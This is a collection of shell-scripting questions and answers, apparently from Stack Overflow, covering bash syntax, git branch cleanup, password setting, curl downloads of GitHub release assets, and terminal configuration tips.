    "How to delete a word in iTerm in mac os": "iTerm2 3.4+\nIn version 3.4, open iTerm preferences. Select Profiles > Keys > Key Mappings > Presets > Natural Text Editing.\nIt should work immediately after.\niTerm2 3.3.12\nIn the older versions of iTerm2 (e.g., 3.3.12)...\nOpen iTerm preferences. Select \"Profiles\" then \"Keys\" and change your presets in \"Natural Text Editing\"",
    "Using the passwd command from within a shell script": "from \"man 1 passwd\":\n   --stdin\n          This option is used to indicate that passwd should read the new\n          password from standard input, which can be a pipe.\nSo in your case\nadduser \"$1\"\necho \"$2\" | passwd \"$1\" --stdin\nYour passwd command may not have a --stdin option: use the chpasswd utility instead, as suggested by ashawley.\nIf you use a shell other than bash, echo might not be a builtin command, and the shell will call /bin/echo. This is insecure because the password will show up in the process table and can be seen with tools like ps.\nIn this case, you should use another scripting language. Here is an example in Perl:\n#!/usr/bin/perl -w\nopen my $pipe, '|chpasswd' or die \"can't open pipe: $!\";\nprint {$pipe} \"$username:$password\";\nclose $pipe",
    "sudo cat << EOF > File doesn't work, sudo su does [duplicate]": "Output redirection (e.g., >) is performed by bash, not by cat, while running with your UID. To run with root's UID use sudo:\nsudo bash -c 'cat << EOF > /etc/yum.repos.d/some-name.repo\nline1\nline2\nline3\nEOF'",
    "Python - Activate conda env through shell script": "I use 'source command' to run the shell script, it works:\nsource shell_script.sh",
    "Automate scp file transfer using a shell script": "Instead of hardcoding password in a shell script, use SSH keys, its easier and secure.\n$ scp -i ~/.ssh/id_rsa *.derp devops@myserver.org:/path/to/target/directory/\nassuming your private key is at ~/.ssh/id_rsa and the files you want to send can be filtered with *.derp\nTo generate a public / private key pair :\n$ ssh-keygen -t rsa\nThe above will generate 2 files, ~/.ssh/id_rsa (private key) and ~/.ssh/id_rsa.pub (public key)\nTo setup the SSH keys for usage (one time task) : Copy the contents of ~/.ssh/id_rsa.pub and paste in a new line of ~devops/.ssh/authorized_keys in myserver.org server. If ~devops/.ssh/authorized_keys doesn't exist, feel free to create it.\nA lucid how-to guide is available here.",
    "Delete all branches that are more than X days/weeks old": "How about using --since and --before?\nFor example, this will delete all branches that have not received any commits for a week:\nfor k in $(git branch | sed /\\*/d); do \n  if [ -z \"$(git log -1 --since='1 week ago' -s $k)\" ]; then\n    git branch -D $k\n  fi\ndone\nIf you want to delete all branches that are more than a week old, use --before:\nfor k in $(git branch | sed /\\*/d); do \n  if [ -z \"$(git log -1 --before='1 week ago' -s $k)\" ]; then\n    git branch -D $k\n  fi\ndone\nBe warned though that this will also delete branches that where not merged into master or whatever the checked out branch is.",
    "How to set uid and gid in Docker Compose?": "Try this\nSo, you need to put:\nuser: \"${UID}:${GID}\"\nin your docker compose and provide UID and GID as docker-compose parameter\nUID=${UID} GID=${GID} docker-compose up\n(or define UID and GID as environment variables).",
    "How to get only the process ID for a specified process name on Linux?": "You can use:\nps -ef | grep '[j]ava'\nOr if pgrep is available then better to use:\npgrep -f java",
    "Clear screen in shell [duplicate]": "Use the shortcut Ctrl + L.\nIt works for all shells, e.g., Python, Bash, MySQL, MATLAB, etc.",
    "Trying to retrieve first 5 characters from string in bash error?": "Depending on your shell, you may be able to use the following syntax:\nexpr substr $string $position $length\nSo for your example:\nTESTSTRINGONE=\"MOTEST\"\necho `expr substr ${TESTSTRINGONE} 0 5`\nAlternatively,\necho 'MOTEST' | cut -c1-5\nor\necho 'MOTEST' | awk '{print substr($0,0,5)}'",
    "Replace the first line in a text file by a string": "sed is the right tool, try doing :\nvar=\"movie.MOV\"\nsed -i \"1s/.*/$var/\" file.txt\nexplanations\n1 mean first line\nthe rest is the substitution s/// : we substitute everything (.*) by the $var variable\nthe double shell quotation is mandatory here\nLearn how to quote properly in shell, it's very important :\n\"Double quote\" every literal that contains spaces/metacharacters and every expansion: \"$var\", \"$(command \"$var\")\", \"${array[@]}\", \"a & b\". Use 'single quotes' for code or literal $'s: 'Costs $5 US', ssh host 'echo \"$HOSTNAME\"'. See\nhttp://mywiki.wooledge.org/Quotes\nhttp://mywiki.wooledge.org/Arguments\nhttp://wiki.bash-hackers.org/syntax/words",
    "Importing functions from a shell script": "According to the \u201cShell Builtin Commands\u201d section of the bash manpage, . aka source takes an optional list of arguments which are passed to the script being sourced. You could use that to introduce a do-nothing option. For example, script.sh could be:\n#!/bin/sh\n\nfoo() {\n    echo foo $1\n}\n\nmain() {\n    foo 1\n    foo 2\n}\n\nif [ \"${1}\" != \"--source-only\" ]; then\n    main \"${@}\"\nfi\nand unit.sh could be:\n#!/bin/bash\n\n. ./script.sh --source-only\n\nfoo 3\nThen script.sh will behave normally, and unit.sh will have access to all the functions from script.sh but will not invoke the main() code.\nNote that the extra arguments to source are not in POSIX, so /bin/sh might not handle it\u2014hence the #!/bin/bash at the start of unit.sh.",
    "How to cut first n and last n columns?": "Cut can take several ranges in -f:\nColumns up to 4 and from 7 onwards:\ncut -f -4,7-\nor for fields 1,2,5,6 and from 10 onwards:\ncut -f 1,2,5,6,10-\netc",
    "How can I execute a command stored in a variable?": "Unix shells operate a series of transformations on each line of input before executing them. For most shells it looks something like this (taken from the Bash man page):\ninitial word splitting\nbrace expansion\ntilde expansion\nparameter, variable and arithmetic expansion\ncommand substitution\nsecondary word splitting\npath expansion (aka globbing)\nquote removal\nUsing $cmd directly gets it replaced by your command during the parameter expansion phase, and it then undergoes all following transformations.\nUsing eval \"$cmd\" does nothing until the quote removal phase, where $cmd is returned as is, and passed as a parameter to eval, whose function is to run the whole chain again before executing.\nSo basically, they're the same in most cases and differ when your command makes use of the transformation steps up to parameter expansion. For example, using brace expansion:\n$ cmd=\"echo foo{bar,baz}\"\n\n$ $cmd\nfoo{bar,baz}\n\n$ eval \"$cmd\"\nfoobar foobaz",
    "What are the differences between using the terminal on a mac vs linux? [closed]": "If you did a new or clean install of OS X version 10.3 or more recent, the default user terminal shell is bash.\nBash is essentially an enhanced and GNU freeware version of the original Bourne shell, sh. If you have previous experience with bash (often the default on GNU/Linux installations), this makes the OS X command-line experience familiar, otherwise consider switching your shell either to tcsh or to zsh, as some find these more user-friendly.\nIf you upgraded from or use OS X version 10.2.x, 10.1.x or 10.0.x, the default user shell is tcsh, an enhanced version of csh('c-shell'). Early implementations were a bit buggy and the programming syntax a bit weird so it developed a bad rap.\nThere are still some fundamental differences between mac and linux as Gordon Davisson so aptly lists, for example no useradd on Mac and ifconfig works differently.\nThe following table is useful for knowing the various unix shells.\nsh      The original Bourne shell   Present on every unix system \nksh     Original Korn shell         Richer shell programming environment than sh \ncsh     Original C-shell            C-like syntax; early versions buggy \ntcsh    Enhanced C-shell            User-friendly and less buggy csh implementation \nbash    GNU Bourne-again shell      Enhanced and free sh implementation \nzsh     Z shell                     Enhanced, user-friendly ksh-like shell\nYou may also find these guides helpful:\nhttp://homepage.mac.com/rgriff/files/TerminalBasics.pdf\nhttp://guides.macrumors.com/Terminal\nhttp://www.ofb.biz/safari/article/476.html\nOn a final note, I am on Linux (Ubuntu 11) and Mac osX so I use bash and the thing I like the most is customizing the .bashrc (source'd from .bash_profile on OSX) file with aliases, some examples below. I now placed all my aliases in a separate .bash_aliases file and include it with:\nif [ -f ~/.bash_aliases ]; then\n    . ~/.bash_aliases\nfi\nin the .bashrc or .bash_profile file.\nNote that this is an example of a mac-linux difference because on a Mac you can't have the --color=auto. The first time I did this (without knowing) I redefined ls to be invalid which was a bit alarming until I removed --auto-color !\nYou may also find https://unix.stackexchange.com/q/127799/10043 useful\n# ~/.bash_aliases\n# ls variants\n#alias l='ls -CF' \nalias la='ls -A' \nalias l='ls -alFtr' \nalias lsd='ls -d .*' \n# Various\nalias h='history | tail'\nalias hg='history | grep'\nalias mv='mv -i' \nalias zap='rm -i'\n# One letter quickies:\nalias p='pwd'\nalias x='exit'\nalias {ack,ak}='ack-grep'\n# Directories\nalias s='cd ..'\nalias play='cd ~/play/'\n# Rails\nalias src='script/rails console'\nalias srs='script/rails server'\nalias raked='rake db:drop db:create db:migrate db:seed' \nalias rvm-restart='source '\\''/home/durrantm/.rvm/scripts/rvm'\\'''\nalias rrg='rake routes | grep '\nalias rspecd='rspec --drb '\n#\n# DropBox - syncd\nWORKBASE=\"~/Dropbox/97_2012/work\"\nalias work=\"cd $WORKBASE\"\nalias code=\"cd $WORKBASE/ror/code\"\n#\n# DropNot - NOT syncd !\nWORKBASE_GIT=\"~/Dropnot\"\nalias {dropnot,not}=\"cd $WORKBASE_GIT\"\nalias {webs,ww}=\"cd $WORKBASE_GIT/webs\"\nalias {setups,docs}=\"cd $WORKBASE_GIT/setups_and_docs\"\nalias {linker,lnk}=\"cd $WORKBASE_GIT/webs/rails_v3/linker\"\n#\n# git\nalias {gsta,gst}='git status' \n# Warning: gst conflicts with gnu-smalltalk (when used).\nalias {gbra,gb}='git branch'\nalias {gco,go}='git checkout'\nalias {gcob,gob}='git checkout -b '\nalias {gadd,ga}='git add '\nalias {gcom,gc}='git commit'\nalias {gpul,gl}='git pull '\nalias {gpus,gh}='git push '\nalias glom='git pull origin master'\nalias ghom='git push origin master'\nalias gg='git grep '\n#\n# vim\nalias v='vim'\n#\n# tmux\nalias {ton,tn}='tmux set -g mode-mouse on'\nalias {tof,tf}='tmux set -g mode-mouse off'\n#\n# dmc\nalias {dmc,dm}='cd ~/Dropnot/webs/rails_v3/dmc/'\nalias wf='cd ~/Dropnot/webs/rails_v3/dmc/dmWorkflow'\nalias ws='cd ~/Dropnot/webs/rails_v3/dmc/dmStaffing'",
    "How to use sed to extract substring": "grep was born to extract things:\ngrep -Po 'name=\"\\K[^\"]*'\ntest with your data:\nkent$  echo '<parameter name=\"PortMappingEnabled\" access=\"readWrite\" type=\"xsd:boolean\"></parameter>\n  <parameter name=\"PortMappingLeaseDuration\" access=\"readWrite\" activeNotify=\"canDeny\" type=\"xsd:unsignedInt\"></parameter>\n  <parameter name=\"RemoteHost\" access=\"readWrite\"></parameter>\n  <parameter name=\"ExternalPort\" access=\"readWrite\" type=\"xsd:unsignedInt\"></parameter>\n  <parameter name=\"ExternalPortEndRange\" access=\"readWrite\" type=\"xsd:unsignedInt\"></parameter>\n  <parameter name=\"InternalPort\" access=\"readWrite\" type=\"xsd:unsignedInt\"></parameter>\n  <parameter name=\"PortMappingProtocol\" access=\"readWrite\"></parameter>\n  <parameter name=\"InternalClient\" access=\"readWrite\"></parameter>\n  <parameter name=\"PortMappingDescription\" access=\"readWrite\"></parameter>\n'|grep -Po 'name=\"\\K[^\"]*'\nPortMappingEnabled\nPortMappingLeaseDuration\nRemoteHost\nExternalPort\nExternalPortEndRange\nInternalPort\nPortMappingProtocol\nInternalClient\nPortMappingDescription",
    "${BASH_SOURCE[0]} equivalent in zsh?": "${BASH_SOURCE[0]} equivalent in zsh is ${(%):-%N}, NOT $0(as OP said, the latter failed in .zshrc)\nHere % indicates prompt expansion on the value, %N indicates \"The name of the script, sourced file, or shell function that zsh is currently executing,\nwhichever was started most recently. If there is none, this is equivalent to the parameter $0.\"(from man zshmisc)",
    "How to find file accessed/created just few minutes ago": "Simply specify whether you want the time to be greater, smaller, or equal to the time you want, using, respectively:\nfind . -cmin +<time>\nfind . -cmin -<time>\nfind . -cmin  <time>\nIn your case, for example, the files with last edition in a maximum of 5 minutes, are given by:\nfind . -cmin -5",
    "How to run a shell script on every request?": "You can execute a shell script via Lua code from the nginx.conf file to achieve this. You need to have the HttpLuaModule to be able to do this.\nHere's an example to do this.\nlocation /my-website {\n  content_by_lua_block {\n    os.execute(\"/bin/myShellScript.sh\")\n  } \n}",
    "How to run 'cd' in shell script and stay there after script finishes?": "You need to source the file as:\n. myfile.sh\nor\nsource myfile.sh\nWithout sourcing the changes will happen in the sub-shell and not in the parent shell which is invoking the script. But when you source a file the lines in the file are executed as if they were typed at the command line.",
    "Convert seconds to hours, minutes, seconds": "Use date, converted to UTC:\n$ date -d@36 -u +%H:%M:%S\n00:00:36\n$ date -d@1036 -u +%H:%M:%S\n00:17:16\n$ date -d@12345 -u +%H:%M:%S\n03:25:45\nThe limitation is the hours will loop at 23, but that doesn't matter for most use cases where you want a one-liner.\nOn macOS, run brew install coreutils and replace date with gdate",
    "how to fix the issue \"Command /bin/sh failed with exit code 1\" in iphone": "Click On Run checkbox if not selected.",
    "How to remove ^[, and all of the ANSI escape sequences in a file using linux shell scripting": "Are you looking for ansifilter?\nTwo things you can do: enter the literal escape (in bash:)\nUsing keyboard entry:\nsed 's/Ctrl-vEsc//g'\nalternatively\nsed 's/Ctrl-vCtrl-[//g'\nOr you can use character escapes:\nsed 's/\\x1b//g'\nor for all control characters:\nsed 's/[\\x01-\\x1F\\x7F]//g' # NOTE: zaps TAB character too!",
    "Check if an element is present in a Bash array [duplicate]": "You could do:\nif [[ \" ${arr[*]} \" == *\" d \"* ]]; then\n    echo \"arr contains d\"\nfi\nThis will give false positives for example if you look for \"a b\" -- that substring is in the joined string but not as an array element. This dilemma will occur for whatever delimiter you choose.\nThe safest way is to loop over the array until you find the element:\narray_contains () {\n    local seeking=$1; shift\n    local in=1\n    for element; do\n        if [[ $element == \"$seeking\" ]]; then\n            in=0\n            break\n        fi\n    done\n    return $in\n}\n\narr=(a b c \"d e\" f g)\narray_contains \"a b\" \"${arr[@]}\" && echo yes || echo no    # no\narray_contains \"d e\" \"${arr[@]}\" && echo yes || echo no    # yes\nHere's a \"cleaner\" version where you just pass the array name, not all its elements\narray_contains2 () { \n    local array=\"$1[@]\"\n    local seeking=$2\n    local in=1\n    for element in \"${!array}\"; do\n        if [[ $element == \"$seeking\" ]]; then\n            in=0\n            break\n        fi\n    done\n    return $in\n}\n\narray_contains2 arr \"a b\"  && echo yes || echo no    # no\narray_contains2 arr \"d e\"  && echo yes || echo no    # yes\nFor associative arrays, there's a very tidy way to test if the array contains a given key: The -v operator\n$ declare -A arr=( [foo]=bar [baz]=qux )\n$ [[ -v arr[foo] ]] && echo yes || echo no\nyes\n$ [[ -v arr[bar] ]] && echo yes || echo no\nno\nSee 6.4 Bash Conditional Expressions in the manual.",
    "Set a parent shell's variable from a subshell": "The whole point of a subshell is that it doesn't affect the calling session. In bash a subshell is a child process, other shells differ but even then a variable setting in a subshell does not affect the caller. By definition.\nDo you need a subshell? If you just need a group then use braces:\na=3\n{ a=4;}\necho $a\ngives 4 (be careful of the spaces in that one). Alternatively, write the variable value to stdout and capture it in the caller:\na=3\na=$(a=4;echo $a)\necho $a\navoid using back-ticks ``, they are deprecated, can be difficult to read and are known to cause issues in certain circumstances.",
    "Force \"git status\" to output color on the terminal (inside a script)": "To avoid changing your git config, you can enable colour just for the current command by passing a config variable with -c.\nFor older git versions (< 2.20.1) the status variable is color.status:\n    git -c color.status=always status | less -REX\nIn modern git versions, and for diff, show, log and grep commands, the variable is color.ui:\n    git -c color.ui=always diff | less -REX\nNotes:\nAssuming you are >2.20.1, color.ui=always is preferable because it's consistent across subcommands.\nthat -c must come before the status or diff argument, and not after.\nAlternatively, for diff, show, log and grep commands, you can use --color=always after the command:\n  git diff --color=always | less -REX\nNote: As Steven said, if you are trying to extract meaningful data, then instead of parsing colours to extract meaning, you can use --porcelain to get more parser-friendly output.\n    git status --porcelain | awk ...\nThen if you wanted, you could reintroduce colours later.\nTo get the user's configured colours, you can use git config --get-colour:\n    reset_color=\"$(tput sgr0)\"\n    remote_branch_color=\"$(git config --get-color color.branch.remote white)\"\n\n    echo \"Pushing to ${remote_branch_color}${branch_name}${reset_color}\"\nSome more examples here.",
    "How to download GitHub Release from private repo using command line": "To download release file from private repo, you can use Personal access token which can be generated at settings/tokens with Full control of private repositories scope.\nThen download the asset with curl command (change with appropriate values):\ncurl -vLJO -H 'Authorization: token my_access_token' 'https://api.github.com/repos/:owner/:repo/releases/assets/:id'\nor if you're using an OAuth app, use:\ncurl -u my_client_id:my_client_secret https://api.github.com/repos/:owner/:repo/releases/assets/:id\nwhere:\n:owner is your user or organisation username;\n:repo is your repository name;\n:id is your asset id, can be found in tag release URL, like:\nhttps://api.github.com/repos/:owner/:repo/releases/tags/:tag \n:token is your personal access token (can be created at /settings/tokens;\nNote: Using access_token as a query param is deprecated.\nSee: Repositories API v3 at GitHub\nHere is the Bash script which can download asset file given specific name of file:\n#!/usr/bin/env bash\n# Script to download asset file from tag release using GitHub API v3.\n# See: http://stackoverflow.com/a/35688093/55075    \nCWD=\"$(cd -P -- \"$(dirname -- \"$0\")\" && pwd -P)\"\n\n# Check dependencies.\nset -e\ntype curl grep sed tr >&2\nxargs=$(which gxargs || which xargs)\n\n# Validate settings.\n[ -f ~/.secrets ] && source ~/.secrets\n[ \"$GITHUB_API_TOKEN\" ] || { echo \"Error: Please define GITHUB_API_TOKEN variable.\" >&2; exit 1; }\n[ $# -ne 4 ] && { echo \"Usage: $0 [owner] [repo] [tag] [name]\"; exit 1; }\n[ \"$TRACE\" ] && set -x\nread owner repo tag name <<<$@\n\n# Define variables.\nGH_API=\"https://api.github.com\"\nGH_REPO=\"$GH_API/repos/$owner/$repo\"\nGH_TAGS=\"$GH_REPO/releases/tags/$tag\"\nAUTH=\"Authorization: token $GITHUB_API_TOKEN\"\nWGET_ARGS=\"--content-disposition --auth-no-challenge --no-cookie\"\nCURL_ARGS=\"-LJO#\"\n\n# Validate token.\ncurl -o /dev/null -sH \"$AUTH\" $GH_REPO || { echo \"Error: Invalid repo, token or network issue!\";  exit 1; }\n\n# Read asset tags.\nresponse=$(curl -sH \"$AUTH\" $GH_TAGS)\n# Get ID of the asset based on given name.\neval $(echo \"$response\" | grep -C3 \"name.:.\\+$name\" | grep -w id | tr : = | tr -cd '[[:alnum:]]=')\n#id=$(echo \"$response\" | jq --arg name \"$name\" '.assets[] | select(.name == $name).id') # If jq is installed, this can be used instead. \n[ \"$id\" ] || { echo \"Error: Failed to get asset id, response: $response\" | awk 'length($0)<100' >&2; exit 1; }\nGH_ASSET=\"$GH_REPO/releases/assets/$id\"\n\n# Download asset file.\necho \"Downloading asset...\" >&2\ncurl $CURL_ARGS -H \"Authorization: token $GITHUB_API_TOKEN\" -H 'Accept: application/octet-stream' \"$GH_ASSET\"\necho \"$0 done.\" >&2\nBefore running, you need to set your GITHUB_API_TOKEN with your GitHub token (see: /settings/tokens at GH). This can be placed in your ~/.secrets file, like:\nGITHUB_API_TOKEN=XXX\nExample script usage:\n./get_gh_asset.sh :owner :repo :tag :name\nwhere name is your filename (or partial of it). Prefix script with TRACE=1 to debug it.\nIn case you wonder why curl fails sometimes with (as mentioned in other answer):\nOnly one auth mechanism allowed; only the X-Amz-Algorithm query parameter, Signature query string parameter or the Authorization header should be specified.\nwhen running like:\ncurl -vLJ -H 'Authorization: token <token>' -H 'Accept: application/octet-stream' https://api.github.com/repos/:owner/:repo/releases/assets/<id>\nthis is because you're specifying multiple mechanism at the same time, so S3 server doesn't know which one to use, therefore you have to choose only one, such as:\nX-Amz-Algorithm query parameter\nSignature query string parameter (X-Amz-Signature)\nAuthorization header (Authorization: token <token>)\nand since GitHub redirects you from asset page (when requesting application/octet-stream), it populates credentials automatically in query string and since curl is passing over the same credentials in the request header (which you've specified), therefore they're conflicting. So as for workaround you can use access_token instead.",
    "How do I add a line break for read command?": "Just looking for the exact same thing. You can use:\n# -r and -e options are unrelated to the answer.\nread -rep $'Please Enter a Message:\\n' message\nAnd it will work exactly as asked:\nPlease enter a Message:\n_\nHere is an extract from the bash manpage on ANSI-C Quoting explaining it:\nWords of the form $'string' are treated specially. The word expands to string, with backslash-escaped characters replaced as specified by the ANSI C standard. Backslash escape sequences, if present, are decoded as follows:\n(...)\n\\n new line\n(...)\nThe expanded result is single-quoted, as if the dollar sign had not been present.\nTook me a while to find out.\nNote that single quotes and double quotes behave differently in this regard, as pointed out under Locale-Specific Translation:\nA double-quoted string preceded by a dollar sign ($) will cause the string to be translated according to the current locale. If the cur- rent locale is C or POSIX, the dollar sign is ignored. If the string is translated and replaced, the replacement is double-quoted.",
    "Setting environment variables in Linux using Bash": "export VAR=value will set VAR to value. Enclose it in single quotes if you want spaces, like export VAR='my val'. If you want the variable to be interpolated, use double quotes, like export VAR=\"$MY_OTHER_VAR\".",
    "Shell script to open a URL": "You don't need to write a script for that. There're some tools that you can use depending on your OS:\nLinux\nxdg-open is available in most Linux distributions. It opens a file or URL in the user's preferred browser (configurable with xdg-settings).\nxdg-open https://stackoverflow.com\nmacOS\nopen opens files and URLs in the default or specified application.\nopen https://stackoverflow.com\nopen -a Firefox https://stackoverflow.com\nWindows\nYou can use the start command at the command prompt to open an URL in the default (or specified) browser.\nstart https://stackoverflow.com\nstart firefox https://stackoverflow.com\nCross-platform\nThe builtin webbrowser Python module works on many platforms.\npython3 -m webbrowser https://stackoverflow.com",
    "Escaping in makefile": "It's the dollar sign, in makefiles you'll have to type $$ to get a single dollar sign:\nM_ARCH := $(shell g++ -dumpmachine | awk '{split($$1,a,\"-\");print a[1]}')",
    "Source files in a bash script": "Execute Shell Script Using . ./ (dot space dot slash)\nWhile executing the shell script using \u201cdot space dot slash\u201d, as shown below, it will execute the script in the current shell without forking a sub shell.\n$ . ./setup.bash\nIn other words, this executes the commands specified in the setup.bash in the current shell, and prepares the environment for you.",
    "What does the 'export' command do?": "export in sh and related shells (such as Bash), marks an environment variable to be exported to child-processes, so that the child inherits them.\nexport is defined in POSIX:\nThe shell shall give the export attribute to the variables corresponding to the specified names, which shall cause them to be in the environment of subsequently executed commands. If the name of a variable is followed by = word, then the value of that variable shall be set to word.",
    "How can I pretty-print a JSON file from the command line?": "Pipe the results from the file into the python json tool 2.6 onwards\npython -m json.tool < 'file_name'",
    "Run multiple curl commands in parallel": "You can use xargs with -P option to run any command in parallel:\nseq 1 200 | xargs -n1 -P10  curl \"http://localhost:5000/example\"\nThis will run curl command 200 times with max 10 jobs in parallel.",
    "When in Vim insert mode, is there a way to add filepath autocompletion?": "For file name omni completion, you can use:\nCtrl-XCtrl-F",
    "unix - count of columns in file": "awk -F'|' '{print NF; exit}' stores.dat \nJust quit right after the first line.",
    "How do you call a function defined in .bashrc from the shell? [duplicate]": "You can export functions. In your ~/.bashrc file after you define the function, add export -f functionname.\nfunction hello() {\n   echo \"Hello, $1!\"\n}\n\nexport -f hello\nThen the function will be available at the shell prompt and also in other scripts that you call from there.\nNote that it's not necessary to export functions unless they are going to be used in child processes (the \"also\" in the previous sentence). Usually, even then, it's better to source the function into the file in which it will be used.\nEdit:\nBrackets in Bash conditional statements are not brackets, they're commands. They have to have spaces around them. If you want to group conditions, use parentheses. Here's your function:\nfunction coolness() {\n\n    if [ -z \"$1\" -o -z \"$2\" ]; then\n        echo \"Usage: $0 [sub_package] [endpoint]\";\n        exit 1;\n    fi\n        echo \"Hi!\"\n}\nA better way to write that conditional is:\n    if [[ -z \"$1\" || -z \"$2\" ]]; then\nbecause the double brackets provide more capability than the single ones.",
    "How to get remote file size from a shell script?": "You can download the file and get its size. But we can do better.\nUse curl to get only the response header using the -I option.\nIn the response header look for Content-Length: which will be followed by the size of the file in bytes.\n$ URL=\"http://api.twitter.com/1/statuses/public_timeline.json\"\n$ curl -sI $URL | grep -i Content-Length\nContent-Length: 134\nTo get the size use a filter to extract the numeric part from the output above:\n$ curl -sI $URL | grep -i Content-Length | awk '{print $2}'\n134",
    "Bash script error: \"function: not found\". Why would this appear?": "Chances are that on your desktop you are not actually running under bash but rather dash or some other POSIX-compliant shell that does not recognize the function keyword. The function keyword is a bashism, a bash extension. POSIX syntax does not use function and mandates the use of parenthesis.\n$ more a.sh\n#!/bin/sh\n\nfunction sayIt {   \n   echo \"hello world\"\n}\n\nsayIt\n$ bash a.sh\nhello world\n$ dash a.sh\na.sh: 3: function: not found\nhello world\na.sh: 5: Syntax error: \"}\" unexpected\nThe POSIX-syntax works in both:\n$ more b.sh\n#!/bin/sh\n\nsayIt () {   \n   echo \"hello world\"\n}\n\nsayIt\n$ bash b.sh\nhello world\n$ dash b.sh\nhello world",
    "Losing newline after assigning grep result to a shell variable": "You're not losing it in the assignment but in the echo. You can see this clearly if you:\necho \"${out}\"\nYou'll see a similar effect with the following script:\nx=\"Hello,\nI\nam\na\nstring\nwith\nnewlines\"\necho \"=====\"\necho ${x}\necho \"=====\"\necho \"${x}\"\necho \"=====\"\nwhich outputs:\n=====\nHello, I am a string with newlines\n=====\nHello,\nI\nam\na\nstring\nwith\nnewlines\n=====\nAnd, irrelevant to your question but I'd like to mention it anyway, I prefer to use the $() construct rather than backticks, just for the added benefit of being able to nest commands. So your script line becomes:\nout=$(grep apache README)\nNow that may not look any different (and it isn't) but it makes possible more complex commands like:\nlines_with_nine=$(grep $(expr 7 + 2) inputfile)",
    "How can I loop over the output of a shell command?": "Never for loop over the results of a shell command if you want to process it line by line unless you are changing the value of the internal field separator $IFS to \\n. This is because the lines will get subject of word splitting which leads to the actual results you are seeing. Meaning if you for example have a file like this:\nfoo bar\nhello world\nThe following for loop\nfor i in $(cat file); do\n    echo \"$i\"\ndone\ngives you:\nfoo\nbar\nhello\nworld\nEven if you use IFS='\\n' the lines might still get subject of Filename expansion\nI recommend to use while + read instead because read reads line by line.\nFurthermore I would use pgrep if you are searching for pids belonging to a certain binary. However, since python might appear as different binaries, like python2.7 or python3.4 I suggest to pass -f to pgrep which makes it search the whole command line rather than just searching for binaries called python. But this will also find processes which have been started like cat foo.py. You have been warned! At the end you can refine the regex passed to pgrep like you wish.\nExample:\npgrep -f python | while read -r pid ; do\n    echo \"$pid\"\ndone\nor if you also want the process name:\npgrep -af python | while read -r line ; do\n    echo \"$line\"\ndone\nIf you want the process name and the pid in separate variables:\npgrep -af python | while read -r pid cmd ; do\n    echo \"pid: $pid, cmd: $cmd\"\ndone\nYou see, read offers a flexible and stable way to process the output of a command line-by-line.\nBtw, if you prefer your ps .. | grep command line over pgrep use the following loop:\nps -ewo pid,etime,cmd | grep python | grep -v grep | grep -v sh \\\n  | while read -r pid etime cmd ; do\n    echo \"$pid $cmd $etime\"\ndone\nNote how I changed the order of etime and cmd. Thus to be able to read cmd, which can contain whitespace, into a single variable. This works because read will break down the line into variables, as many times as you specified variables. The remaining part of the line - possibly including whitespace - will get assigned to the last variable which has been specified in the command line.",
    "Is there a way to avoid positional arguments in bash?": "The common way of doing that is assigning the arguments to local variables in the function, i.e.:\ncopy() {\n    local from=${1}\n    local to=${2}\n\n    # ...\n}\nAnother solution may be getopt-style option parsing.\ncopy() {\n    local arg from to\n    while getopts 'f:t:' arg\n    do\n        case ${arg} in\n            f) from=${OPTARG};;\n            t) to=${OPTARG};;\n            *) return 1 # illegal option\n        esac\n    done\n}\n\ncopy -f /tmp/a -t /tmp/b\nSadly, bash can't handle long options which would be more readable, i.e.:\ncopy --from /tmp/a --to /tmp/b\nFor that, you either need to use the external getopt program (which I think has long option support only on GNU systems) or implement the long option parser by hand, i.e.:\ncopy() {\n    local from to\n\n    while [[ ${1} ]]; do\n        case \"${1}\" in\n            --from)\n                from=${2}\n                shift\n                ;;\n            --to)\n                to=${2}\n                shift\n                ;;\n            *)\n                echo \"Unknown parameter: ${1}\" >&2\n                return 1\n        esac\n\n        if ! shift; then\n            echo 'Missing parameter argument.' >&2\n            return 1\n        fi\n    done\n}\n\ncopy --from /tmp/a --to /tmp/b\nAlso see: using getopts in bash shell script to get long and short command line options\nYou can also be lazy, and just pass the 'variables' as arguments to the function, i.e.:\ncopy() {\n    local \"${@}\"\n\n    # ...\n}\n\ncopy from=/tmp/a to=/tmp/b\nand you'll have ${from} and ${to} in the function as local variables.\nJust note that the same issue as below applies \u2014 if a particular variable is not passed, it will be inherited from parent environment. You may want to add a 'safety line' like:\ncopy() {\n    local from to    # reset first\n    local \"${@}\"\n\n    # ...\n}\nto ensure that ${from} and ${to} will be unset when not passed.\nAnd if something very bad is of your interest, you could also assign the arguments as global variables when invoking the function, i.e.:\nfrom=/tmp/a to=/tmp/b copy\nThen you could just use ${from} and ${to} within the copy() function. Just note that you should then always pass all parameters. Otherwise, a random variable may leak into the function.\nfrom= to=/tmp/b copy   # safe\nto=/tmp/b copy         # unsafe: ${from} may be declared elsewhere\nIf you have bash 4.1 (I think), you can also try using associative arrays. It will allow you to pass named arguments but it will be ugly. Something like:\nargs=( [from]=/tmp/a [to]=/tmp/b )\ncopy args\nAnd then in copy(), you'd need to grab the array.",
    "In bash, is there an equivalent of die \"error msg\"": "You can roll your own easily enough:\ndie() { echo \"$*\" 1>&2 ; exit 1; }\n...\ndie \"Kaboom\"",
    "Why do shell script comparisons often use x$VAR = xyes?": "If you're using a shell that does simple substitution and the SHELL_VAR variable does not exist (or is blank), then you need to watch out for the edge cases. The following translations will happen:\nif test $SHELL_VAR = yes; then        -->  if test = yes; then\nif test x$SHELL_VAR = xyes; then      -->  if test x = xyes; then\nThe first of these will generate an error since the fist argument to test has gone missing. The second does not have that problem.\nYour case translates as follows:\nif test \"x$SHELL_VAR\" = \"xyes\"; then  -->  if test \"x\" = \"xyes\"; then\nThe x, at least for POSIX-compliant shells, is actually redundant since the quotes ensue that both an empty argument and one containing spaces are interpreted as a single object.",
    "How to stop java process gracefully?": "Shutdown hooks execute in all cases where the VM is not forcibly killed. So, if you were to issue a \"standard\" kill (SIGTERM from a kill command) then they will execute. Similarly, they will execute after calling System.exit(int).\nHowever a hard kill (kill -9 or kill -SIGKILL) then they won't execute. Similarly (and obviously) they won't execute if you pull the power from the computer, drop it into a vat of boiling lava, or beat the CPU into pieces with a sledgehammer. You probably already knew that, though.\nFinalizers really should run as well, but it's best not to rely on that for shutdown cleanup, but rather rely on your shutdown hooks to stop things cleanly. And, as always, be careful with deadlocks (I've seen far too many shutdown hooks hang the entire process)!",
